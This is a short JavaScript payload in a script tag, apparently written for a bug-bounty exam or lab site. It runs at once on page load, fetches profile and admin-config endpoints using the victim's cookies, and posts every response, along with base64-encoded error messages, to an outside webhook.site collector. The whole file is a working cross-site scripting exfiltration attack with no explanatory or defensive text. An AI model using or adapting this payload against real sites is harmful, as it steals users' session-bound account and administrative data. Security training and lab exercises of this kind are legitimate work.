<script>
    const logger = "https://webhook.site/e0ddef86-5a1f-472e-a42c-9612ab165efe";

    async function hunt() {
        // List of potential endpoints where the secret might live
        const targets = [
            "/api/auth/profile",
            "/api/auth/me",
            "/api/admin/config"
        ];

        for (const path of targets) {
            try {
                const response = await fetch("https://api-bugbounty-exam.hashacademy.co" + path, {
                    method: "GET",
                    credentials: "include"
                });
                const data = await response.json();

                // Send the findings to your webhook
                await fetch(logger, {
                    method: "POST",
                    body: JSON.stringify({
                        endpoint: path,
                        content: data
                    })
                });
            } catch (e) {
                // Log errors if the endpoint doesn't exist or is blocked
                await fetch(logger + "?error=" + btoa(path + ": " + e.message));
            }
        }
    }

    hunt();
</script>
